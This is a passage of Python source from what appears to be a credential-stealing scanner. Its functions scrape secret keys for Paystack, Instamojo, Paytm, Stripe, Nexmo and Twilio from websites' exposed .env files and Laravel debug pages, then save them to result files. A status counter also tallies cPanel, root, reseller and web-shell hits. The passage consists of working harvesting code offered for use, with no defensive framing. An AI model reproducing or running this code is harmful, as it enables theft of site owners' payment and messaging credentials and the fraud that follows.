				if "SSLCZ_STORE_ID" in SRC_: SSLCZ_STORE_ID = reg('<td>SSLCZ_STORE_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "SSLCZ_STORE_PASSWD" in SRC_: SSLCZ_STORE_PASSWD = reg('<td>SSLCZ_STORE_PASSWD<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			TEMP = "URL: {}\nMETHOD: {}\nSSLCZ_STORE_ID: {}\nSSLCZ_STORE_PASSWD: {}\n===================================\n\n".format(URL_, METHOD_, SSLCZ_STORE_ID, SSLCZ_STORE_PASSWD)
			SSLCZ_STORE = open("Rzlts/SSLCZ_STORE.txt", "a+")
			SSLCZ_STORE.write(TEMP)
			SSLCZ_STORE.close()
			TOTAL_SSLCZ_STORE+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	else:
		pass
	# ////////////////////////////////////////////////////////////////
	# ////////////////////////////////////////////////////////////////


def GET_PAYSTACK(SRC_, URL_, METHOD_):
	global TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS
	PAYSTACK_PUBLIC_KEY = ""; PAYSTACK_SECRET_KEY = ""; PAYSTACK_MERCHANT_EMAIL = ""; PAYSTACK_PAYMENT_URL = "";
	# ////////////////////////////////////////////////////////////////
	if METHOD_ == "[/.ENV]":
		if "PAYSTACK_PUBLIC_KEY=" in SRC_ and "PAYSTACK_SECRET_KEY=" in SRC_:
			if "PAYSTACK_PUBLIC_KEY" in SRC_: PAYSTACK_PUBLIC_KEY = SRC_.split("PAYSTACK_PUBLIC_KEY=")[1].split("\n")[0]
			if "PAYSTACK_SECRET_KEY" in SRC_: PAYSTACK_SECRET_KEY = SRC_.split("PAYSTACK_SECRET_KEY=")[1].split("\n")[0]
			if "PAYSTACK_MERCHANT_EMAIL" in SRC_: PAYSTACK_MERCHANT_EMAIL = SRC_.split("PAYSTACK_MERCHANT_EMAIL=")[1].split("\n")[0]
			if "PAYSTACK_PAYMENT_URL" in SRC_: PAYSTACK_PAYMENT_URL = SRC_.split("PAYSTACK_PAYMENT_URL=")[1].split("\n")[0]
			TEMP = "URL: {}\nMETHOD: {}\nPAYSTACK_PUBLIC_KEY: {}\nPAYSTACK_SECRET_KEY: {}\nPAYSTACK_MERCHANT_EMAIL: {}\nPAYSTACK_PAYMENT_URL: {}\n===================================\n\n".format(URL_, METHOD_, PAYSTACK_PUBLIC_KEY, PAYSTACK_SECRET_KEY, PAYSTACK_MERCHANT_EMAIL, PAYSTACK_PAYMENT_URL)
			PAYSTACK = open("Rzlts/PAYSTACK.txt", "a+")
			PAYSTACK.write(TEMP)
			PAYSTACK.close()
			TOTAL_PAYSTACK+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	elif METHOD_ == "[DEBUG]":
		if "<td>PAYSTACK_PUBLIC_KEY</td>" in SRC_ and "<td>PAYSTACK_SECRET_KEY</td>" in SRC_:
			try:
				if "PAYSTACK_PUBLIC_KEY" in SRC_: PAYSTACK_PUBLIC_KEY = reg('<td>PAYSTACK_PUBLIC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "PAYSTACK_SECRET_KEY" in SRC_: PAYSTACK_SECRET_KEY = reg('<td>PAYSTACK_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "PAYSTACK_MERCHANT_EMAIL" in SRC_: PAYSTACK_MERCHANT_EMAIL = reg('<td>PAYSTACK_MERCHANT_EMAIL<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "PAYSTACK_PAYMENT_URL" in SRC_: PAYSTACK_PAYMENT_URL = reg('<td>PAYSTACK_PAYMENT_URL<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			TEMP = "URL: {}\nMETHOD: {}\nPAYSTACK_PUBLIC_KEY: {}\nPAYSTACK_SECRET_KEY: {}\nPAYSTACK_MERCHANT_EMAIL: {}\nPAYSTACK_PAYMENT_URL: {}\n===================================\n\n".format(URL_, METHOD_, PAYSTACK_PUBLIC_KEY, PAYSTACK_SECRET_KEY, PAYSTACK_MERCHANT_EMAIL, PAYSTACK_PAYMENT_URL)
			PAYSTACK = open("Rzlts/PAYSTACK.txt", "a+")
			PAYSTACK.write(TEMP)
			PAYSTACK.close()
			TOTAL_PAYSTACK+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	else:
		pass
	# ////////////////////////////////////////////////////////////////
	# ////////////////////////////////////////////////////////////////


def GET_INSTAMOJO(SRC_, URL_, METHOD_):
	global TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS
	INSTAMOJO_API_KEY = ""; INSTAMOJO_AUTH_TOKEN = "";
	# ////////////////////////////////////////////////////////////////
	if METHOD_ == "[/.ENV]":
		if "INSTAMOJO_API_KEY=" in SRC_ and "INSTAMOJO_AUTH_TOKEN=" in SRC_:
			if "INSTAMOJO_API_KEY" in SRC_: INSTAMOJO_API_KEY = SRC_.split("INSTAMOJO_API_KEY=")[1].split("\n")[0]
			if "INSTAMOJO_AUTH_TOKEN" in SRC_: INSTAMOJO_AUTH_TOKEN = SRC_.split("INSTAMOJO_AUTH_TOKEN=")[1].split("\n")[0]
			TEMP = "URL: {}\nMETHOD: {}\nINSTAMOJO_API_KEY: {}\nINSTAMOJO_AUTH_TOKEN: {}\n===================================\n\n".format(URL_, METHOD_, INSTAMOJO_API_KEY, INSTAMOJO_AUTH_TOKEN)
			INSTAMOJO = open("Rzlts/INSTAMOJO.txt", "a+")
			INSTAMOJO.write(TEMP)
			INSTAMOJO.close()
			TOTAL_INSTAMOJO+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	elif METHOD_ == "[DEBUG]":
		if "<td>INSTAMOJO_API_KEY</td>" in SRC_ and "<td>INSTAMOJO_AUTH_TOKEN</td>" in SRC_:
			try:
				if "INSTAMOJO_API_KEY" in SRC_: INSTAMOJO_API_KEY = reg('<td>INSTAMOJO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "INSTAMOJO_AUTH_TOKEN" in SRC_: INSTAMOJO_AUTH_TOKEN = reg('<td>INSTAMOJO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			TEMP = "URL: {}\nMETHOD: {}\nINSTAMOJO_API_KEY: {}\nINSTAMOJO_AUTH_TOKEN: {}\n===================================\n\n".format(URL_, METHOD_, INSTAMOJO_API_KEY, INSTAMOJO_AUTH_TOKEN)
			INSTAMOJO = open("Rzlts/INSTAMOJO.txt", "a+")
			INSTAMOJO.write(TEMP)
			INSTAMOJO.close()
			TOTAL_INSTAMOJO+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	else:
		pass
	# ////////////////////////////////////////////////////////////////
	# ////////////////////////////////////////////////////////////////


def GET_PAYTM(SRC_, URL_, METHOD_):
	global TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS
	PAYTM_ENVIRONMENT = ""; PAYTM_MERCHANT_ID = ""; PAYTM_MERCHANT_KEY = ""; PAYTM_MERCHANT_WEBSITE = ""; PAYTM_CHANNEL = ""; PAYTM_INDUSTRY_TYPE = "";
	# ////////////////////////////////////////////////////////////////
	if METHOD_ == "[/.ENV]":
		if "PAYTM_ENVIRONMENT=" in SRC_ and "PAYTM_MERCHANT_ID=" in SRC_:
			if "PAYTM_ENVIRONMENT" in SRC_: PAYTM_ENVIRONMENT = SRC_.split("PAYTM_ENVIRONMENT=")[1].split("\n")[0]
			if "PAYTM_MERCHANT_ID" in SRC_: PAYTM_MERCHANT_ID = SRC_.split("PAYTM_MERCHANT_ID=")[1].split("\n")[0]
			if "PAYTM_MERCHANT_KEY" in SRC_: PAYTM_MERCHANT_KEY = SRC_.split("PAYTM_MERCHANT_KEY=")[1].split("\n")[0]
			if "PAYTM_MERCHANT_WEBSITE" in SRC_: PAYTM_MERCHANT_WEBSITE = SRC_.split("PAYTM_MERCHANT_WEBSITE=")[1].split("\n")[0]
			if "PAYTM_CHANNEL" in SRC_: PAYTM_CHANNEL = SRC_.split("PAYTM_CHANNEL=")[1].split("\n")[0]
			if "PAYTM_INDUSTRY_TYPE" in SRC_: PAYTM_INDUSTRY_TYPE = SRC_.split("PAYTM_INDUSTRY_TYPE=")[1].split("\n")[0]
			TEMP = "URL: {}\nMETHOD: {}\nPAYTM_ENVIRONMENT: {}\nPAYTM_MERCHANT_ID: {}\nPAYTM_MERCHANT_KEY: {}\nPAYTM_MERCHANT_WEBSITE: {}\nPAYTM_CHANNEL: {}\nPAYTM_INDUSTRY_TYPE: {}\n===================================\n\n".format(URL_, METHOD_, PAYTM_ENVIRONMENT, PAYTM_MERCHANT_ID, PAYTM_MERCHANT_KEY, PAYTM_MERCHANT_WEBSITE, PAYTM_CHANNEL, PAYTM_INDUSTRY_TYPE)
			PAYTM = open("Rzlts/PAYTM.txt", "a+")
			PAYTM.write(TEMP)
			PAYTM.close()
			TOTAL_PAYTM+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	elif METHOD_ == "[DEBUG]":
		if "<td>PAYTM_ENVIRONMENT</td>" in SRC_ and "<td>PAYTM_MERCHANT_ID</td>" in SRC_:
			try:
				if "PAYTM_ENVIRONMENT" in SRC_: PAYTM_ENVIRONMENT = reg('<td>PAYTM_ENVIRONMENT<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "PAYTM_MERCHANT_ID" in SRC_: PAYTM_MERCHANT_ID = reg('<td>PAYTM_MERCHANT_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "PAYTM_MERCHANT_KEY" in SRC_: PAYTM_MERCHANT_KEY = reg('<td>PAYTM_MERCHANT_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "PAYTM_MERCHANT_WEBSITE" in SRC_: PAYTM_MERCHANT_WEBSITE = reg('<td>PAYTM_MERCHANT_WEBSITE<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "PAYTM_CHANNEL" in SRC_: PAYTM_CHANNEL = reg('<td>PAYTM_CHANNEL<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "PAYTM_INDUSTRY_TYPE" in SRC_: PAYTM_INDUSTRY_TYPE = reg('<td>PAYTM_INDUSTRY_TYPE<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			TEMP = "URL: {}\nMETHOD: {}\nPAYTM_ENVIRONMENT: {}\nPAYTM_MERCHANT_ID: {}\nPAYTM_MERCHANT_KEY: {}\nPAYTM_MERCHANT_WEBSITE: {}\nPAYTM_CHANNEL: {}\nPAYTM_INDUSTRY_TYPE: {}\n===================================\n\n".format(URL_, METHOD_, PAYTM_ENVIRONMENT, PAYTM_MERCHANT_ID, PAYTM_MERCHANT_KEY, PAYTM_MERCHANT_WEBSITE, PAYTM_CHANNEL, PAYTM_INDUSTRY_TYPE)
			PAYTM = open("Rzlts/PAYTM.txt", "a+")
			PAYTM.write(TEMP)
			PAYTM.close()
			TOTAL_PAYTM+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	else:
		pass
	# ////////////////////////////////////////////////////////////////
	# ////////////////////////////////////////////////////////////////


def GET_STRIPE(SRC_, URL_, METHOD_):
	global TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS
	STRIPE_KEY = ""; STRIPE_SECRET = ""; PAYSTACK_MERCHANT_EMAIL = ""; PAYSTACK_PAYMENT_URL = "";
	# ////////////////////////////////////////////////////////////////
	if METHOD_ == "[/.ENV]":
		if "STRIPE_KEY=" in SRC_ and "STRIPE_SECRET=" in SRC_:
			if "STRIPE_KEY" in SRC_: STRIPE_KEY = SRC_.split("STRIPE_KEY=")[1].split("\n")[0]
			if "STRIPE_SECRET" in SRC_: STRIPE_SECRET = SRC_.split("STRIPE_SECRET=")[1].split("\n")[0]
			TEMP = "URL: {}\nMETHOD: {}\nSTRIPE_KEY: {}\nSTRIPE_SECRET: {}\n===================================\n\n".format(URL_, METHOD_, STRIPE_KEY, STRIPE_SECRET)
			STRIPE = open("Rzlts/STRIPE.txt", "a+")
			STRIPE.write(TEMP)
			STRIPE.close()
			TOTAL_STRIPE+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	elif METHOD_ == "[DEBUG]":
		if "<td>STRIPE_KEY</td>" in SRC_ and "<td>STRIPE_SECRET</td>" in SRC_:
			try:
				if "STRIPE_KEY" in SRC_: STRIPE_KEY = reg('<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "STRIPE_SECRET" in SRC_: STRIPE_SECRET = reg('<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			TEMP = "URL: {}\nMETHOD: {}\nSTRIPE_KEY: {}\nSTRIPE_SECRET: {}\n===================================\n\n".format(URL_, METHOD_, STRIPE_KEY, STRIPE_SECRET)
			STRIPE = open("Rzlts/STRIPE.txt", "a+")
			STRIPE.write(TEMP)
			STRIPE.close()
			TOTAL_STRIPE+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	else:
		pass
	# ////////////////////////////////////////////////////////////////
	# ////////////////////////////////////////////////////////////////


# ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
# ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


def GET_NEXMO(SRC_, URL_, METHOD_):
	global TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS
	NEXMO_KEY = ""; NEXMO_SECRET = ""; NEXMO_FROM = "";
	# ////////////////////////////////////////////////////////////////
	if METHOD_ == "[/.ENV]":
		if "NEXMO_KEY=" in SRC_ and "NEXMO_SECRET=" in SRC_:
			if "NEXMO_KEY" in SRC_: NEXMO_KEY = SRC_.split("NEXMO_KEY=")[1].split("\n")[0]
			if "NEXMO_SECRET" in SRC_: NEXMO_SECRET = SRC_.split("NEXMO_SECRET=")[1].split("\n")[0]
			if "NEXMO_FROM" in SRC_: NEXMO_FROM = SRC_.split("NEXMO_FROM=")[1].split("\n")[0]
		else:
			pass
	elif METHOD_ == "[DEBUG]":
		if "<td>NEXMO_KEY</td>" in SRC_ and "<td>NEXMO_SECRET</td>" in SRC_:
			try:
				if "NEXMO_KEY" in SRC_: NEXMO_KEY = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "NEXMO_SECRET" in SRC_: NEXMO_SECRET = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "NEXMO_FROM" in SRC_: NEXMO_FROM = reg('<td>NEXMO_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
		else:
			pass
	else:
		pass
	if len(NEXMO_KEY) < 7 or len(NEXMO_SECRET) < 7:
		pass
	else:
		TEMP = "URL: {}\nMETHOD: {}\nNEXMO_KEY: {}\nNEXMO_SECRET: {}\nNEXMO_FROM: {}\n===================================\n\n".format(URL_, METHOD_, NEXMO_KEY, NEXMO_SECRET, NEXMO_FROM)
		NEXMO = open("Rzlts/NEXMO.txt", "a+")
		NEXMO.write(TEMP)
		NEXMO.close()
		TOTAL_NEXMO+=1
		os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
	# ////////////////////////////////////////////////////////////////
	# ////////////////////////////////////////////////////////////////


def GET_TWILIO(SRC_, URL_, METHOD_):
	global TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS
	TWILIO_SID = ""; TWILIO_TOKEN = ""; TWILIO_FROM = "";
	# ////////////////////////////////////////////////////////////////
	if METHOD_ == "[/.ENV]":
		if "TWILIO_SID=" in SRC_ and "TWILIO_TOKEN=" in SRC_:
			if "TWILIO_SID=" in SRC_: TWILIO_SID = SRC_.split("TWILIO_SID=")[1].split("\n")[0]
			if "TWILIO_SID =" in SRC_: TWILIO_SID = SRC_.split("TWILIO_SID =")[1].split("\n")[0]
			if "TWILIO_TOKEN=" in SRC_: TWILIO_TOKEN = SRC_.split("TWILIO_TOKEN=")[1].split("\n")[0]
			if "TWILIO_TOKEN =" in SRC_: TWILIO_TOKEN = SRC_.split("TWILIO_TOKEN =")[1].split("\n")[0]
			if "TWILIO_FROM=" in SRC_: TWILIO_FROM = SRC_.split("TWILIO_FROM=")[1].split("\n")[0]
			if "TWILIO_FROM =" in SRC_: TWILIO_FROM = SRC_.split("TWILIO_FROM =")[1].split("\n")[0]
			TEMP = "URL: {}\nMETHOD: {}\nTWILIO_SID: {}\nTWILIO_TOKEN: {}\nTWILIO_FROM: {}\n===================================\n\n".format(URL_, METHOD_, TWILIO_SID, TWILIO_TOKEN, TWILIO_FROM)
			TWILIO = open("Rzlts/TWILIO.txt", "a+")
			TWILIO.write(TEMP)
			TWILIO.close()
			TOTAL_TWILIO+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	elif METHOD_ == "[DEBUG]":
		if "<td>TWILIO_SID</td>" in SRC_ and "<td>TWILIO_TOKEN</td>" in SRC_:
			try:
				if "TWILIO_SID" in SRC_: TWILIO_SID = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "TWILIO_TOKEN" in SRC_: TWILIO_TOKEN = reg('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			try:
				if "TWILIO_FROM" in SRC_: TWILIO_FROM = reg('<td>TWILIO_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>', SRC_)[0]
			except: pass
			TEMP = "URL: {}\nMETHOD: {}\nTWILIO_SID: {}\nTWILIO_TOKEN: {}\nTWILIO_FROM: {}\n===================================\n\n".format(URL_, METHOD_, TWILIO_SID, TWILIO_TOKEN, TWILIO_FROM)
			TWILIO = open("Rzlts/TWILIO.txt", "a+")
			TWILIO.write(TEMP)
			TWILIO.close()
			TOTAL_TWILIO+=1
			os.system("title "+ "DB: {}, DOSpace: {}, RtPlaid: {}, Pusher: {}, SSLCZ: {}, PayStack: {}, InstaMojo: {}, PayTM: {}, Stripe: {}, Nexmo: {}, Twilio: {}, MailChimp: {}, SMTP: {}, AWS_KEY: {}, Cpanel: {}, Root: {}, Reseller: {}, Shells: {}".format(TOTAL_DB, TOTAL_DO_SPACES, TOTAL_RT_PLAID, TOTAL_PUSHER, TOTAL_SSLCZ_STORE, TOTAL_PAYSTACK, TOTAL_INSTAMOJO, TOTAL_PAYTM, TOTAL_STRIPE, TOTAL_NEXMO, TOTAL_TWILIO, TOTAL_MAILCHIMP, TOTAL_SMTP, TOTAL_AWS_KEY, TOTAL_CP, TOTAL_ROOT, TOTAL_RS, TOTAL_SHELLS))
		else:
			pass
	else:
		pass
	# ////////////////////////////////////////////////////////////////
	# ////////////////////////////////////////////////////////////////


def GET_MAILCHIMP(SRC_, URL_, METHOD_):
